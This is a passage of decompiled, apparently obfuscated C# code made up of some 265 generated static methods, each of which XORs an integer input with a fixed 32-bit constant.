	[Obsolete("Exclude")]
	public static int smethod_204(int int_4)
	{
		return int_4 ^ 0x67499BCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_205(int int_4)
	{
		return int_4 ^ 0x3B890171;
	}

	[Obsolete("Exclude")]
	public static int smethod_206(int int_4)
	{
		return int_4 ^ 0x2AD787FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_207(int int_4)
	{
		return int_4 ^ 0x44D3DC2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_208(int int_4)
	{
		return int_4 ^ 0x284F19D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_209(int int_4)
	{
		return int_4 ^ 0x67DDD0D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_210(int int_4)
	{
		return int_4 ^ 0x39622BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_211(int int_4)
	{
		return int_4 ^ 0xB1A3469;
	}

	[Obsolete("Exclude")]
	public static int smethod_212(int int_4)
	{
		return int_4 ^ 0x59516FCD;
	}

	[Obsolete("Exclude")]
	public static int smethod_213(int int_4)
	{
		return int_4 ^ 0x64809DB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_214(int int_4)
	{
		return int_4 ^ 0x13A7B61D;
	}

	[Obsolete("Exclude")]
	public static int smethod_215(int int_4)
	{
		return int_4 ^ 0x5C942171;
	}

	[Obsolete("Exclude")]
	public static int smethod_216(int int_4)
	{
		return int_4 ^ 0x250E0483;
	}

	[Obsolete("Exclude")]
	public static int smethod_217(int int_4)
	{
		return int_4 ^ 0x51635DAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_218(int int_4)
	{
		return int_4 ^ 0x4AED3555;
	}

	[Obsolete("Exclude")]
	public static int smethod_219(int int_4)
	{
		return int_4 ^ 0x132EB94A;
	}

	[Obsolete("Exclude")]
	public static int smethod_220(int int_4)
	{
		return int_4 ^ 0x58A7BC9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_221(int int_4)
	{
		return int_4 ^ 0x27481924;
	}

	[Obsolete("Exclude")]
	public static int smethod_222(int int_4)
	{
		return int_4 ^ 0x4DA86BFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_223(int int_4)
	{
		return int_4 ^ 0x148D58A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_224(int int_4)
	{
		return int_4 ^ 0x66DD38CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_225(int int_4)
	{
		return int_4 ^ 0x6E6E1743;
	}

	[Obsolete("Exclude")]
	public static int smethod_226(int int_4)
	{
		return int_4 ^ 0x36057F60;
	}

	[Obsolete("Exclude")]
	public static int smethod_227(int int_4)
	{
		return int_4 ^ 0x7551489B;
	}

	[Obsolete("Exclude")]
	public static int smethod_228(int int_4)
	{
		return int_4 ^ 0x2DCC6B77;
	}

	[Obsolete("Exclude")]
	public static int smethod_229(int int_4)
	{
		return int_4 ^ 0x1B698F9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_230(int int_4)
	{
		return int_4 ^ 0x1AEC32F;
	}

	[Obsolete("Exclude")]
	public static int smethod_231(int int_4)
	{
		return int_4 ^ 0x5005FBBC;
	}

	[Obsolete("Exclude")]
	public static int smethod_232(int int_4)
	{
		return int_4 ^ 0x748FC0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_233(int int_4)
	{
		return int_4 ^ 0x38B75DF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_234(int int_4)
	{
		return int_4 ^ 0x6EB55F00;
	}

	[Obsolete("Exclude")]
	public static int smethod_235(int int_4)
	{
		return int_4 ^ 0x51A4502E;
	}

	[Obsolete("Exclude")]
	public static int smethod_236(int int_4)
	{
		return int_4 ^ 0x78CFE0C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_237(int int_4)
	{
		return int_4 ^ 0x3AB900EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_238(int int_4)
	{
		return int_4 ^ 0x7A6245E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_239(int int_4)
	{
		return int_4 ^ 0x726BA2E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_240(int int_4)
	{
		return int_4 ^ 0x4BDAC968;
	}

	[Obsolete("Exclude")]
	public static int smethod_241(int int_4)
	{
		return int_4 ^ 0x63DCA05A;
	}

	[Obsolete("Exclude")]
	public static int smethod_242(int int_4)
	{
		return int_4 ^ 0x86E0076;
	}

	[Obsolete("Exclude")]
	public static int smethod_243(int int_4)
	{
		return int_4 ^ 0x1A4EC90C;
	}

	[Obsolete("Exclude")]
	public static int smethod_244(int int_4)
	{
		return int_4 ^ 0x55AE9110;
	}

	[Obsolete("Exclude")]
	public static int smethod_245(int int_4)
	{
		return int_4 ^ 0x587E0601;
	}

	[Obsolete("Exclude")]
	public static int smethod_246(int int_4)
	{
		return int_4 ^ 0x7F99A7FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_247(int int_4)
	{
		return int_4 ^ 0x5DF0BB58;
	}

	[Obsolete("Exclude")]
	public static int smethod_248(int int_4)
	{
		return int_4 ^ 0x66521AC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_249(int int_4)
	{
		return int_4 ^ 0x194B9FE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_250(int int_4)
	{
		return int_4 ^ 0x482A58F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_251(int int_4)
	{
		return int_4 ^ 0x2C3D8C9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_252(int int_4)
	{
		return int_4 ^ 0x11FAE0B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_253(int int_4)
	{
		return int_4 ^ 0x634C0F8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_254(int int_4)
	{
		return int_4 ^ 0x2B522AF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_255(int int_4)
	{
		return int_4 ^ 0x2B126223;
	}

	[Obsolete("Exclude")]
	public static int smethod_256(int int_4)
	{
		return int_4 ^ 0x151703DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_257(int int_4)
	{
		return int_4 ^ 0x636A5755;
	}

	[Obsolete("Exclude")]
	public static int smethod_258(int int_4)
	{
		return int_4 ^ 0x40A16B7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_259(int int_4)
	{
		return int_4 ^ 0x50213D4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_260(int int_4)
	{
		return int_4 ^ 0x41C1C0D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_261(int int_4)
	{
		return int_4 ^ 0x73BA9769;
	}

	[Obsolete("Exclude")]
	public static int smethod_262(int int_4)
	{
		return int_4 ^ 0x28327FFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_263(int int_4)
	{
		return int_4 ^ 0x185B97A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_264(int int_4)
	{
		return int_4 ^ 0x7B1D3BFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_265(int int_4)
	{
		return int_4 ^ 0xF241D55;
	}

	[Obsolete("Exclude")]
	public static int smethod_266(int int_4)
	{
		return int_4 ^ 0x74E035E;
	}

	[Obsolete("Exclude")]
	public static int smethod_267(int int_4)
	{
		return int_4 ^ 0x4F14318E;
	}

	[Obsolete("Exclude")]
	public static int smethod_268(int int_4)
	{
		return int_4 ^ 0x735FFE7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_269(int int_4)
	{
		return int_4 ^ 0x460F7A64;
	}

	[Obsolete("Exclude")]
	public static int smethod_270(int int_4)
	{
		return int_4 ^ 0x63F185B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_271(int int_4)
	{
		return int_4 ^ 0x7DFF6B0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_272(int int_4)
	{
		return int_4 ^ 0x538F717A;
	}

	[Obsolete("Exclude")]
	public static int smethod_273(int int_4)
	{
		return int_4 ^ 0x30197CC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_274(int int_4)
	{
		return int_4 ^ 0xDD507CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_275(int int_4)
	{
		return int_4 ^ 0x5587CDF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_276(int int_4)
	{
		return int_4 ^ 0x8D747D;
	}

	[Obsolete("Exclude")]
	public static int smethod_277(int int_4)
	{
		return int_4 ^ 0x7449FA31;
	}

	[Obsolete("Exclude")]
	public static int smethod_278(int int_4)
	{
		return int_4 ^ 0x5C2F19C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_279(int int_4)
	{
		return int_4 ^ 0x34BA7A88;
	}

	[Obsolete("Exclude")]
	public static int smethod_280(int int_4)
	{
		return int_4 ^ 0x23E2C323;
	}

	[Obsolete("Exclude")]
	public static int smethod_281(int int_4)
	{
		return int_4 ^ 0x7EAA5E6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_282(int int_4)
	{
		return int_4 ^ 0x52684CC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_283(int int_4)
	{
		return int_4 ^ 0x16D01BDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_284(int int_4)
	{
		return int_4 ^ 0x676B727D;
	}

	[Obsolete("Exclude")]
	public static int smethod_285(int int_4)
	{
		return int_4 ^ 0x50D3D6F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_286(int int_4)
	{
		return int_4 ^ 0x6D3979CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_287(int int_4)
	{
		return int_4 ^ 0x12A88E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_288(int int_4)
	{
		return int_4 ^ 0x6895AA53;
	}

	[Obsolete("Exclude")]
	public static int smethod_289(int int_4)
	{
		return int_4 ^ 0x2E7F3A6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_290(int int_4)
	{
		return int_4 ^ 0x6D543BC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_291(int int_4)
	{
		return int_4 ^ 0x6E02D2BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_292(int int_4)
	{
		return int_4 ^ 0x1C703C7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_293(int int_4)
	{
		return int_4 ^ 0x6181EA8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_294(int int_4)
	{
		return int_4 ^ 0x53AEA231;
	}

	[Obsolete("Exclude")]
	public static int smethod_295(int int_4)
	{
		return int_4 ^ 0x68DE627C;
	}

	[Obsolete("Exclude")]
	public static int smethod_296(int int_4)
	{
		return int_4 ^ 0x24617534;
	}

	[Obsolete("Exclude")]
	public static int smethod_297(int int_4)
	{
		return int_4 ^ 0x688F97C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_298(int int_4)
	{
		return int_4 ^ 0x47A11354;
	}

	[Obsolete("Exclude")]
	public static int smethod_299(int int_4)
	{
		return int_4 ^ 0x3E8503A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_300(int int_4)
	{
		return int_4 ^ 0x70DE8C5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_301(int int_4)
	{
		return int_4 ^ 0x1C88DF66;
	}

	[Obsolete("Exclude")]
	public static int smethod_302(int int_4)
	{
		return int_4 ^ 0x6F90E5BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_303(int int_4)
	{
		return int_4 ^ 0xE0AC706;
	}

	[Obsolete("Exclude")]
	public static int smethod_304(int int_4)
	{
		return int_4 ^ 0x74E0244E;
	}

	[Obsolete("Exclude")]
	public static int smethod_305(int int_4)
	{
		return int_4 ^ 0x7A50E2E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_306(int int_4)
	{
		return int_4 ^ 0x755A5121;
	}

	[Obsolete("Exclude")]
	public static int smethod_307(int int_4)
	{
		return int_4 ^ 0x58B066AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_308(int int_4)
	{
		return int_4 ^ 0x2B717F3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_309(int int_4)
	{
		return int_4 ^ 0x62257BF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_310(int int_4)
	{
		return int_4 ^ 0x241D3DF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_311(int int_4)
	{
		return int_4 ^ 0x52A2EB11;
	}

	[Obsolete("Exclude")]
	public static int smethod_312(int int_4)
	{
		return int_4 ^ 0x6B16847E;
	}

	[Obsolete("Exclude")]
	public static int smethod_313(int int_4)
	{
		return int_4 ^ 0x1C629B45;
	}

	[Obsolete("Exclude")]
	public static int smethod_314(int int_4)
	{
		return int_4 ^ 0x3C67174F;
	}

	[Obsolete("Exclude")]
	public static int smethod_315(int int_4)
	{
		return int_4 ^ 0x2EBC7B20;
	}

	[Obsolete("Exclude")]
	public static int smethod_316(int int_4)
	{
		return int_4 ^ 0x59CDA3E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_317(int int_4)
	{
		return int_4 ^ 0x7F101FB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_318(int int_4)
	{
		return int_4 ^ 0x2840291F;
	}

	[Obsolete("Exclude")]
	public static int smethod_319(int int_4)
	{
		return int_4 ^ 0x628993AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_320(int int_4)
	{
		return int_4 ^ 0x34CF8312;
	}

	[Obsolete("Exclude")]
	public static int smethod_321(int int_4)
	{
		return int_4 ^ 0x4DA4FDD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_322(int int_4)
	{
		return int_4 ^ 0x23F9D4AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_323(int int_4)
	{
		return int_4 ^ 0x62A2BB0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_324(int int_4)
	{
		return int_4 ^ 0x3053F1A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_325(int int_4)
	{
		return int_4 ^ 0xB024EAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_326(int int_4)
	{
		return int_4 ^ 0xB16F1EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_327(int int_4)
	{
		return int_4 ^ 0x66A2078B;
	}

	[Obsolete("Exclude")]
	public static int smethod_328(int int_4)
	{
		return int_4 ^ 0x7544F9EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_329(int int_4)
	{
		return int_4 ^ 0x4D526673;
	}

	[Obsolete("Exclude")]
	public static int smethod_330(int int_4)
	{
		return int_4 ^ 0xC9D7673;
	}

	[Obsolete("Exclude")]
	public static int smethod_331(int int_4)
	{
		return int_4 ^ 0x6DFEDF61;
	}

	[Obsolete("Exclude")]
	public static int smethod_332(int int_4)
	{
		return int_4 ^ 0x177CC546;
	}

	[Obsolete("Exclude")]
	public static int smethod_333(int int_4)
	{
		return int_4 ^ 0x6703D490;
	}

	[Obsolete("Exclude")]
	public static int smethod_334(int int_4)
	{
		return int_4 ^ 0xAEDEEC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_335(int int_4)
	{
		return int_4 ^ 0x681448F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_336(int int_4)
	{
		return int_4 ^ 0x208990FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_337(int int_4)
	{
		return int_4 ^ 0x7DBAA2A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_338(int int_4)
	{
		return int_4 ^ 0x699E27CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_339(int int_4)
	{
		return int_4 ^ 0x2363EFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_340(int int_4)
	{
		return int_4 ^ 0x35F4CC13;
	}

	[Obsolete("Exclude")]
	public static int smethod_341(int int_4)
	{
		return int_4 ^ 0x264B6D78;
	}

	[Obsolete("Exclude")]
	public static int smethod_342(int int_4)
	{
		return int_4 ^ 0x3DE0A415;
	}

	[Obsolete("Exclude")]
	public static int smethod_343(int int_4)
	{
		return int_4 ^ 0x7FFE7306;
	}

	[Obsolete("Exclude")]
	public static int smethod_344(int int_4)
	{
		return int_4 ^ 0x10702DDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_345(int int_4)
	{
		return int_4 ^ 0x2F360067;
	}

	[Obsolete("Exclude")]
	public static int smethod_346(int int_4)
	{
		return int_4 ^ 0x3E4A3B10;
	}

	[Obsolete("Exclude")]
	public static int smethod_347(int int_4)
	{
		return int_4 ^ 0x56D40CE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_348(int int_4)
	{
		return int_4 ^ 0x2D7F27CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_349(int int_4)
	{
		return int_4 ^ 0x8CC3DDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_350(int int_4)
	{
		return int_4 ^ 0x11E43415;
	}

	[Obsolete("Exclude")]
	public static int smethod_351(int int_4)
	{
		return int_4 ^ 0x6BFF33B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_352(int int_4)
	{
		return int_4 ^ 0x1AEFD2EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_353(int int_4)
	{
		return int_4 ^ 0x53BD560A;
	}

	[Obsolete("Exclude")]
	public static int smethod_354(int int_4)
	{
		return int_4 ^ 0x6A916E54;
	}

	[Obsolete("Exclude")]
	public static int smethod_355(int int_4)
	{
		return int_4 ^ 0x1BE2D30A;
	}

	[Obsolete("Exclude")]
	public static int smethod_356(int int_4)
	{
		return int_4 ^ 0x71C7FFAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_357(int int_4)
	{
		return int_4 ^ 0x74B95528;
	}

	[Obsolete("Exclude")]
	public static int smethod_358(int int_4)
	{
		return int_4 ^ 0x5DC179EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_359(int int_4)
	{
		return int_4 ^ 0x2C429A53;
	}

	[Obsolete("Exclude")]
	public static int smethod_360(int int_4)
	{
		return int_4 ^ 0x5F3CD2EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_361(int int_4)
	{
		return int_4 ^ 0x7789708F;
	}

	[Obsolete("Exclude")]
	public static int smethod_362(int int_4)
	{
		return int_4 ^ 0x4FC14F28;
	}

	[Obsolete("Exclude")]
	public static int smethod_363(int int_4)
	{
		return int_4 ^ 0x44AC67F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_364(int int_4)
	{
		return int_4 ^ 0x375197AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_365(int int_4)
	{
		return int_4 ^ 0x10E9E51D;
	}

	[Obsolete("Exclude")]
	public static int smethod_366(int int_4)
	{
		return int_4 ^ 0x9897B83;
	}

	[Obsolete("Exclude")]
	public static int smethod_367(int int_4)
	{
		return int_4 ^ 0x79783E31;
	}

	[Obsolete("Exclude")]
	public static int smethod_368(int int_4)
	{
		return int_4 ^ 0x677A3206;
	}

	[Obsolete("Exclude")]
	public static int smethod_369(int int_4)
	{
		return int_4 ^ 0x4F0A7CAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_370(int int_4)
	{
		return int_4 ^ 0x1DBF7A96;
	}

	[Obsolete("Exclude")]
	public static int smethod_371(int int_4)
	{
		return int_4 ^ 0x1B356D6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_372(int int_4)
	{
		return int_4 ^ 0x2E91AA1F;
	}

	[Obsolete("Exclude")]
	public static int smethod_373(int int_4)
	{
		return int_4 ^ 0x552470A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_374(int int_4)
	{
		return int_4 ^ 0x3EC4B06C;
	}

	[Obsolete("Exclude")]
	public static int smethod_375(int int_4)
	{
		return int_4 ^ 0xC2FD138;
	}

	[Obsolete("Exclude")]
	public static int smethod_376(int int_4)
	{
		return int_4 ^ 0x7AA4CF84;
	}

	[Obsolete("Exclude")]
	public static int smethod_377(int int_4)
	{
		return int_4 ^ 0xBFF219D;
	}

	[Obsolete("Exclude")]
	public static int smethod_378(int int_4)
	{
		return int_4 ^ 0x539B69CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_379(int int_4)
	{
		return int_4 ^ 0x22C9E6B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_380(int int_4)
	{
		return int_4 ^ 0x5E8D4466;
	}

	[Obsolete("Exclude")]
	public static int smethod_381(int int_4)
	{
		return int_4 ^ 0x587BD9E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_382(int int_4)
	{
		return int_4 ^ 0x224FE644;
	}

	[Obsolete("Exclude")]
	public static int smethod_383(int int_4)
	{
		return int_4 ^ 0x5C982D86;
	}

	[Obsolete("Exclude")]
	public static int smethod_384(int int_4)
	{
		return int_4 ^ 0x514FB9A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_385(int int_4)
	{
		return int_4 ^ 0x561439A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_386(int int_4)
	{
		return int_4 ^ 0x3BF874BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_387(int int_4)
	{
		return int_4 ^ 0x64C9D79E;
	}

	[Obsolete("Exclude")]
	public static int smethod_388(int int_4)
	{
		return int_4 ^ 0xFA4EE2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_389(int int_4)
	{
		return int_4 ^ 0x3B072089;
	}

	[Obsolete("Exclude")]
	public static int smethod_390(int int_4)
	{
		return int_4 ^ 0x322C560A;
	}

	[Obsolete("Exclude")]
	public static int smethod_391(int int_4)
	{
		return int_4 ^ 0xF21776F;
	}

	[Obsolete("Exclude")]
	public static int smethod_392(int int_4)
	{
		return int_4 ^ 0x30B9ADA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_393(int int_4)
	{
		return int_4 ^ 0x38A9E802;
	}

	[Obsolete("Exclude")]
	public static int smethod_394(int int_4)
	{
		return int_4 ^ 0x1EBC9999;
	}

	[Obsolete("Exclude")]
	public static int smethod_395(int int_4)
	{
		return int_4 ^ 0x50FF7C6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_396(int int_4)
	{
		return int_4 ^ 0x19BA66A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_397(int int_4)
	{
		return int_4 ^ 0x159EBF1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_398(int int_4)
	{
		return int_4 ^ 0x783FFE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_399(int int_4)
	{
		return int_4 ^ 0xA2DDC3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_400(int int_4)
	{
		return int_4 ^ 0x2EF3AA91;
	}

	[Obsolete("Exclude")]
	public static int smethod_401(int int_4)
	{
		return int_4 ^ 0x39C643A;
	}

	[Obsolete("Exclude")]
	public static int smethod_402(int int_4)
	{
		return int_4 ^ 0x369798FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_403(int int_4)
	{
		return int_4 ^ 0x49D9E940;
	}

	[Obsolete("Exclude")]
	public static int smethod_404(int int_4)
	{
		return int_4 ^ 0x78323961;
	}

	[Obsolete("Exclude")]
	public static int smethod_405(int int_4)
	{
		return int_4 ^ 0x49479314;
	}

	[Obsolete("Exclude")]
	public static int smethod_406(int int_4)
	{
		return int_4 ^ 0x3B80DBFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_407(int int_4)
	{
		return int_4 ^ 0x756619BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_408(int int_4)
	{
		return int_4 ^ 0x2DF46D7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_409(int int_4)
	{
		return int_4 ^ 0x5751614;
	}

	[Obsolete("Exclude")]
	public static int smethod_410(int int_4)
	{
		return int_4 ^ 0x628BD6EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_411(int int_4)
	{
		return int_4 ^ 0x8ED0282;
	}

	[Obsolete("Exclude")]
	public static int smethod_412(int int_4)
	{
		return int_4 ^ 0x558EBE2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_413(int int_4)
	{
		return int_4 ^ 0xD89CEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_414(int int_4)
	{
		return int_4 ^ 0x482EC0DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_415(int int_4)
	{
		return int_4 ^ 0x6565601E;
	}

	[Obsolete("Exclude")]
	public static int smethod_416(int int_4)
	{
		return int_4 ^ 0x328A924D;
	}

	[Obsolete("Exclude")]
	public static int smethod_417(int int_4)
	{
		return int_4 ^ 0x2971AE21;
	}

	[Obsolete("Exclude")]
	public static int smethod_418(int int_4)
	{
		return int_4 ^ 0x5E02C44B;
	}

	[Obsolete("Exclude")]
	public static int smethod_419(int int_4)
	{
		return int_4 ^ 0x4DA1C153;
	}

	[Obsolete("Exclude")]
	public static int smethod_420(int int_4)
	{
		return int_4 ^ 0x64F14D52;
	}

	[Obsolete("Exclude")]
	public static int smethod_421(int int_4)
	{
		return int_4 ^ 0xA34D8DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_422(int int_4)
	{
		return int_4 ^ 0x39325D92;
	}

	[Obsolete("Exclude")]
	public static int smethod_423(int int_4)
	{
		return int_4 ^ 0x4B42A455;
	}

	[Obsolete("Exclude")]
	public static int smethod_424(int int_4)
	{
		return int_4 ^ 0xF1E8D6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_425(int int_4)
	{
		return int_4 ^ 0x14DB327E;
	}

	[Obsolete("Exclude")]
	public static int smethod_426(int int_4)
	{
		return int_4 ^ 0x1FAEB46C;
	}

	[Obsolete("Exclude")]
	public static int smethod_427(int int_4)
	{
		return int_4 ^ 0x2D923969;
	}

	[Obsolete("Exclude")]
	public static int smethod_428(int int_4)
	{
		return int_4 ^ 0x2F1445ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_429(int int_4)
	{
		return int_4 ^ 0x6EF1797E;
	}

	[Obsolete("Exclude")]
	public static int smethod_430(int int_4)
	{
		return int_4 ^ 0x419405AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_431(int int_4)
	{
		return int_4 ^ 0x2E9BB2CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_432(int int_4)
	{
		return int_4 ^ 0x439C8663;
	}

	[Obsolete("Exclude")]
	public static int smethod_433(int int_4)
	{
		return int_4 ^ 0x6510908F;
	}

	[Obsolete("Exclude")]
	public static int smethod_434(int int_4)
	{
		return int_4 ^ 0x4864D8FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_435(int int_4)
	{
		return int_4 ^ 0x35998781;
	}

	[Obsolete("Exclude")]
	public static int smethod_436(int int_4)
	{
		return int_4 ^ 0x1771924C;
	}

	[Obsolete("Exclude")]
	public static int smethod_437(int int_4)
	{
		return int_4 ^ 0x7A9AABD;
	}

	[Obsolete("Exclude")]
	public static int smethod_438(int int_4)
	{
		return int_4 ^ 0x2E0CDE71;
	}

	[Obsolete("Exclude")]
	public static int smethod_439(int int_4)
	{
		return int_4 ^ 0x42118DB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_440(int int_4)
	{
		return int_4 ^ 0x4E87136F;
	}

	[Obsolete("Exclude")]
	public static int smethod_441(int int_4)
	{
		return int_4 ^ 0x5CBD482;
	}

	[Obsolete("Exclude")]
	public static int smethod_442(int int_4)
	{
		return int_4 ^ 0x2279FBE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_443(int int_4)
	{
		return int_4 ^ 0x48B15575;
	}

	[Obsolete("Exclude")]
	public static int smethod_444(int int_4)
	{
		return int_4 ^ 0x48176CCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_445(int int_4)
	{
		return int_4 ^ 0x66975827;
	}

	[Obsolete("Exclude")]
	public static int smethod_446(int int_4)
	{
		return int_4 ^ 0x3C17A3A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_447(int int_4)
	{
		return int_4 ^ 0x1D8649B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_448(int int_4)
	{
		return int_4 ^ 0x3213F2D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_449(int int_4)
	{
		return int_4 ^ 0x687313EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_450(int int_4)
	{
		return int_4 ^ 0x34C46A47;
	}

	[Obsolete("Exclude")]
	public static int smethod_451(int int_4)
	{
		return int_4 ^ 0x61CFC3C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_452(int int_4)
	{
		return int_4 ^ 0x4599BDF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_453(int int_4)
	{
		return int_4 ^ 0x78220A92;
	}

	[Obsolete("Exclude")]
	public static int smethod_454(int int_4)
	{
		return int_4 ^ 0x3A9E747;
	}

	[Obsolete("Exclude")]
	public static int smethod_455(int int_4)
	{
		return int_4 ^ 0x4626D0FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_456(int int_4)
	{
		return int_4 ^ 0x5683CBF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_457(int int_4)
	{
		return int_4 ^ 0x2BED512D;
	}

	[Obsolete("Exclude")]
	public static int smethod_458(int int_4)
	{
		return int_4 ^ 0x130EE646;
	}

	[Obsolete("Exclude")]
	public static int smethod_459(int int_4)
	{
		return int_4 ^ 0x38739FA7;
	}

	[Obsolete("Exclude")]
	public static int smethod_460(int int_4)
	{
		return int_4 ^ 0x4529D18C;
	}

	[Obsolete("Exclude")]
	public static int smethod_461(int int_4)
	{
		return int_4 ^ 0x4DEC6CE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_462(int int_4)
	{
		return int_4 ^ 0x6CDB9612;
	}

	[Obsolete("Exclude")]
	public static int smethod_463(int int_4)
	{
		return int_4 ^ 0x1FE2A47E;
	}

	[Obsolete("Exclude")]
	public static int smethod_464(int int_4)
	{
		return int_4 ^ 0x64FDD97B;
	}

	[Obsolete("Exclude")]
	public static int smethod_465(int int_4)
	{
		return int_4 ^ 0x655FFC6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_466(int int_4)
	{
		return int_4 ^ 0x683E1122;
	}

	[Obsolete("Exclude")]
	public static int smethod_467(int int_4)
	{
		return int_4 ^ 0x642537B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_468(int int_4)
	{
		return int_4 ^ 0x7869C87A;
	}

	[Obsolete("Exclude")]
